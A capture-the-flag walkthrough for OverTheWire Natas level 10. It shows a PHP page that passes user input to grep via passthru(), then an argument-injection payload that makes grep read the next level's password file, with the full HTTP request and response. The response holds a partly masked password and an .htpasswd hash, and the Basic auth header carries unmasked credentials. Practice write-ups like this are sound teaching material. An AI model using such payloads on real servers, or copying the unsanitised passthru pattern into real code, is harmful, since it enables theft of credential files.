# level 10

**Host**: http://natas10.natas.labs.overthewire.org
>natas10:t7I5VHvpa14sJTUGV0cbEs**********

When you visit the site, you get the following message:

```
For security reasons, we now filter on certain characters
Find words containing:
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This time the the characters `;`, `|` and `&` are filtered, but we can add the password file `/etc/natas_webpass/natas11` to the files that are processed by `grep` and search for all strings with `.*`.

```http
GET /?needle=.*+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search HTTP/1.1
Host: natas10.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMxMDp0N0k1Vkh2cGExNHNKVFVHVjBjYkVzYllmRlAyZG1PdQ==
Connection: keep-alive
Referer: http://natas10.natas.labs.overthewire.org/?needle=*+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

This gives you the password for natas11 in the response.

```html
HTTP/1.1 200 OK
Date: Thu, 04 Sep 2025 08:58:32 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 1216026

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$ABQa8ztY$WS9a/gEW5xwZb5Pi0wF2c0
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZ**********
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
...
```